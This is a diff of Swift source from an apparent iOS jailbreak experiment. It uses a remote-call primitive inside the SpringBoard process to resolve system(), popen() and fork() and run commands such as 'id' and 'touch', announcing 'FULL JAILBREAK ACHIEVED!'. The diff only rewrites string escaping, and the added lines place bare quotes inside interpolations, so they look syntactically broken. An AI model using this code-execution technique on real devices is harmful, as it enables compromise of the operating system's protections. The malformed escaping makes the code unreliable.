@@ -6181,13 +6181,13 @@ struct AMFIExperimentView: View {
         let systemSym = remote_alloc_str(sb, "system")
         let systemAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, systemSym)
         RootExecutor.rcall(sb, "free", systemSym)
-        detail += "system(): 0x\(String(format: \"%llx\", systemAddr))\n"
+        detail += "system(): 0x\(String(format: "%llx", systemAddr))\n"
 
         if systemAddr != 0 {
             detail += "system() FOUND!\n\n"
 
             // Coba system("id > /var/tmp/.dsp_system_out")
-            detail += "--- system(\"id > /var/tmp/.dsp_system_out\") ---\n"
+            detail += "--- system("id > /var/tmp/.dsp_system_out") ---\n"
             let cmd1 = remote_alloc_str(sb, "id > /var/tmp/.dsp_system_out")
             let ret1 = RootExecutor.rcallAddr(sb, systemAddr, cmd1)
             RootExecutor.rcall(sb, "free", cmd1)
@@ -6214,7 +6214,7 @@ struct AMFIExperimentView: View {
                         let outStr = String(bytes: outBytes, encoding: .utf8) ?? "(binary)"
                         detail += "Output: \(outStr)\n"
                         if outStr.contains("uid=") {
-                            detail += "\n\U0001F3C6\U0001F3C6\U0001F3C6 SYSTEM() WORKS! \U0001F3C6\U0001F3C6\U0001F3C6\n"
+                            detail += "\n🏆🏆🏆 SYSTEM() WORKS! 🏆🏆🏆\n"
                             detail += "Command execution dari SpringBoard!\n"
                             detail += "FULL JAILBREAK ACHIEVED!\n"
                         }
@@ -6232,7 +6232,7 @@ struct AMFIExperimentView: View {
             }
 
             // Coba system("touch /var/tmp/.dsp_proof")
-            detail += "\n--- system(\"touch /var/tmp/.dsp_proof\") ---\n"
+            detail += "\n--- system("touch /var/tmp/.dsp_proof") ---\n"
             let cmd2 = remote_alloc_str(sb, "touch /var/tmp/.dsp_proof")
             let ret2 = RootExecutor.rcallAddr(sb, systemAddr, cmd2)
             RootExecutor.rcall(sb, "free", cmd2)
@@ -6241,9 +6241,9 @@ struct AMFIExperimentView: View {
             // Check if file exists
             let proofPath = remote_alloc_str(sb, "/var/tmp/.dsp_proof")
             let proofCheck = RootExecutor.rcall(sb, "access", proofPath, 0)
-            detail += "access(.dsp_proof): \(proofCheck == 0 ? \"EXISTS!\": \"not found\")\n"
+            detail += "access(.dsp_proof): \(proofCheck == 0 ? "EXISTS!": "not found")\n"
             if proofCheck == 0 {
-                detail += "\U0001F3C6 touch WORKED! File created via system()!\n"
+                detail += "🏆 touch WORKED! File created via system()!\n"
                 RootExecutor.rcall(sb, "unlink", proofPath)
             }
             RootExecutor.rcall(sb, "free", proofPath)
@@ -6256,7 +6256,7 @@ struct AMFIExperimentView: View {
         let popenSym = remote_alloc_str(sb, "popen")
         let popenAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, popenSym)
         RootExecutor.rcall(sb, "free", popenSym)
-        detail += "popen(): 0x\(String(format: \"%llx\", popenAddr))\n"
+        detail += "popen(): 0x\(String(format: "%llx", popenAddr))\n"
 
         if popenAddr != 0 {
             detail += "popen() FOUND!\n"
@@ -6264,7 +6264,7 @@ struct AMFIExperimentView: View {
             let cmd = remote_alloc_str(sb, "id")
             let mode = remote_alloc_str(sb, "r")
             let fp = RootExecutor.rcallAddr(sb, popenAddr, cmd, mode)
-            detail += "popen(\"id\", \"r\"): fp=0x\(String(format: \"%llx\", fp))\n"
+            detail += "popen("id", "r"): fp=0x\(String(format: "%llx", fp))\n"
 
             if fp != 0 {
                 // fread from fp
@@ -6286,7 +6286,7 @@ struct AMFIExperimentView: View {
                         let outStr = String(bytes: outBytes, encoding: .utf8) ?? "(binary)"
                         detail += "Output: \(outStr)\n"
                         if outStr.contains("uid=") || outStr.contains("mobile") {
-                            detail += "\n\U0001F3C6 POPEN WORKS! Command output captured!\n"
+                            detail += "\n🏆 POPEN WORKS! Command output captured!\n"
                         }
                     }
                 }
@@ -6309,7 +6309,7 @@ struct AMFIExperimentView: View {
             detail += "We are in child! (should not see this from parent RC)\n"
         } else if forkRet != UInt64(bitPattern: -1) {
             detail += "fork() returned child PID=\(forkRet)!\n"
-            detail += "\U0001F3C6 FORK WORKS dari SpringBoard!\n"
+            detail += "🏆 FORK WORKS dari SpringBoard!\n"
             // Kill child
             RootExecutor.rcall(sb, "kill", forkRet, 9)
             RootExecutor.rcall(sb, "waitpid", forkRet, mem + 0x3400, 0)
@@ -6320,9 +6320,9 @@ struct AMFIExperimentView: View {
 
         // Summary
         detail += "\n=== SUMMARY ===\n"
-        let success = detail.contains("\U0001F3C6")
+        let success = detail.contains("🏆")
         if success {
-            detail += "\U0001F3C6 CODE/COMMAND EXECUTION ACHIEVED!\n"
+            detail += "🏆 CODE/COMMAND EXECUTION ACHIEVED!\n"
         } else {
             detail += "system/popen/fork semua gagal dari SpringBoard.\n"
         }
